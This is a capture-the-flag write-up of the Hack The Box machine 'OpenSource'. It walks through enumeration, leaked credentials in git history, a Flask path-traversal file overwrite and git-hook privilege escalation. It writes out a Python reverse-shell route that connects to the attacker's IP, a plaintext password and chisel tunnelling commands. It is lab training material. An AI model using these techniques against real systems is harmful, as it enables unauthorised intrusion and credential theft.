---
title: "[HTB] Machine: OpenSource"
description: "[HTB] Machine: OpenSource"
date: 2023-08-28
menu:
  sidebar:
    name: "[HTB] Machine: OpenSource"
    identifier: htb-machine-OpenSource
    parent: htb-machines-linux
    weight: 10
hero: images/opensource.png
tags: ["HTB", "upload", "source-code", "git", "git-hooks", "flask", "directory-traversal", "file-read", "flask-debug", "flask-debug-pin",  "chisel", "gitea", "pspy", "werkzeug", "werkzeug-debug"]
---

# OpenSource
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.11.164 -T4 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 18:01 BST
Stats: 0:11:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 97.88% done; ETC: 18:13 (0:00:15 remaining)
Nmap scan report for 10.10.11.164 (10.10.11.164)
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp
```
```
└─$ nmap -Pn -sC -sV 10.10.11.164 -T4 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 18:14 BST
Stats: 0:01:00 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 18:15 (0:00:42 remaining)
Nmap scan report for 10.10.11.164 (10.10.11.164)
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 28 Aug 2023 17:13:51 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 28 Aug 2023 17:13:52 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
3000/tcp filtered ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94%I=7%D=8/28%Time=64ECD5F3%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1039,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
SF:ython/3\.10\.3\r\nDate:\x20Mon,\x2028\x20Aug\x202023\x2017:13:51\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:5316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x20
SF:\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=
SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\
SF:n\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Free!
SF:</title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jque
SF:ry-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/stat
SF:ic/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<script
SF:\x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\n\
SF:x20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaround
SF:\.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href
SF:=\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<li
SF:nk\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boo
SF:tstrap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
SF:ef=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\x20
SF:\x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\
SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Mon,\x2028\
SF:x20Aug\x202023\x2017:13:52\x20GMT\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x20GET\r\nContent-Length:\x20
SF:0\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTM
SF:L\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x2
SF:0</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>E
SF:rror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code
SF::\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20req
SF:uest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20
SF:\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
- Web Server

![](./images/1.png)

![](./images/2.png)

![](./images/3.png)


- `gobuster`
```
└─$ gobuster dir -u http://10.10.11.164 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.164
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2023/08/28 18:18:08 Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 200) [Size: 2489147]
/console              (Status: 200) [Size: 1563]

```
## Foothold
- If we visit `/download` we download source files
  - It indicates that the app is running in `docker` container

```
└─$ tree -L 2
.
├── app
│   ├── app
│   ├── INSTALL.md
│   ├── public
│   └── run.py
├── build-docker.sh
├── config
│   └── supervisord.conf
└── Dockerfile
```
- Let's start by analyzing `git`

![](./images/4.png)

- `dev` branch
  - `git checkout dev`
  - We have proxy creds removed in the third commit: `dev01:Soulless_Developer#2022`
  - Also `Dockerfile` indicates that `flask` is in debug mode

![](./images/5.png)

![](./images/6.png)

- In master branch `views.py` we have only 2 routes
```
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

- While in `dev` branch we have 4
  - Which we see in actual box, so probably `dev` app is currently running
  - Moreover we saw `console` route also in `gobuster`
```
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

```

- `/console` 

![](./images/7.png)

- We have a potential `lfi` in `upcloud` route

```
file_name = get_file_name(f.filename)
file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
```

- If we read the [docs](https://docs.python.org/3.10/library/os.path.html#os.path.join)
  - `If a segment is an absolute path (which on Windows requires both a drive and a root), then all previous segments are ignored and joining continues from the absolute path segment.`
  - If we visit `http://10.10.11.164/uploads//etc/passwd`, it results in error
  - 

![](./images/8.png)

- We can utilize `get_file_name` function in `utils.py`, which replaces `../`
  - So if we send `http://10.10.11.164/uploads/..//etc/passwd`, it could work

![](./images/9.png)


- Since app is running in debug mode, it will reload source files whenever there are changes occur
  - So we can try overwriting `views.py` using `upcloud` route (both `uploads` and `upcloud` use `os.path.join`)
    - For example adding one more route with web shell or reverse shell
  - We know the location of the app is in `/app` based on `Dockerfile`

![](./images/10.png)


- Modify `views.py`
  - Add `revshell` route with reverse shell code

```
...
@app.route('/revshell')
def revshell():
    import socket
    import os
    import pty
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.16.5",6666))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("sh")
```

- Let's start listener and upload malicious source file
  - We need to intercept the request and change the `filename`
  - I had weird symbols, but after upgrading the shell they dissappeared

![](./images/11.png)

![](./images/12.png)

## User
- Enumerate
  - We know it's a container
```
/ # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:07  
          inet addr:172.17.0.7  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:995159 errors:0 dropped:0 overruns:0 frame:0
          TX packets:994203 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:86315357 (82.3 MiB)  TX bytes:155143921 (147.9 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

```
```
/ # ip route
default via 172.17.0.1 dev eth0 
172.17.0.0/16 dev eth0 scope link  src 172.17.0.7 
```

- I was stuck here for a while, until I saw a port `3000` in `nmap` results which was filtered
  - So I tried `wget` that port from container (`curl` is not installed)
  - It's a `Gitea`

![](./images/13.png)

- Let's upload `chisel` and configure port forwarding
  - Container: `./chisel client 10.10.16.5:9001 R:3000:172.17.0.1:3000`, forward remote(`R`) port `3000` (attack box) to `172.17.0.1:3000`
  - Attack box: `./chisel server -p  9001 --reverse`
  - Now we can check `Gitea` from our attack box

![](./images/14.png)

- Use creds for `dev01` that were found before
  - We have `home-backup` repo with `.ssh` and keys in it
  - Let's download them

![](./images/15.png)

![](./images/16.png)

- `ssh` using the key
  - Don't forget `chmod 600 id_rsa`

![](./images/17.png)

## Root
- No `sudo` rights
  - Creds for `dev01` works
  - `linpeas` shows `git-sync` script in `/usr/local/bin/`
  - `pspy` also shows the same script running every minute

![](./images/18.png)

![](./images/19.png)

- The content of the `git-sync`
```
dev01@opensource:/tmp$ cat /usr/local/bin/git-sync 
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

- We can utilize [git-hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
  - So that whenever someone tries to commit `dev01`'s home directory, the custom script will be launched ( because we know that it's being backed up by script above periodically)
    - According to docs, everything with `.sample` is skipped

![](./images/20.png)

- Let's create a reverse shell script in `hooks` directory 
  - `...The pre-commit hook is run first, before you even type in a commit message...`, so let's name our script `pre-commit`

![](./images/21.png)

![](./images/22.png)

- Get `root` flag

![](./images/23.png)
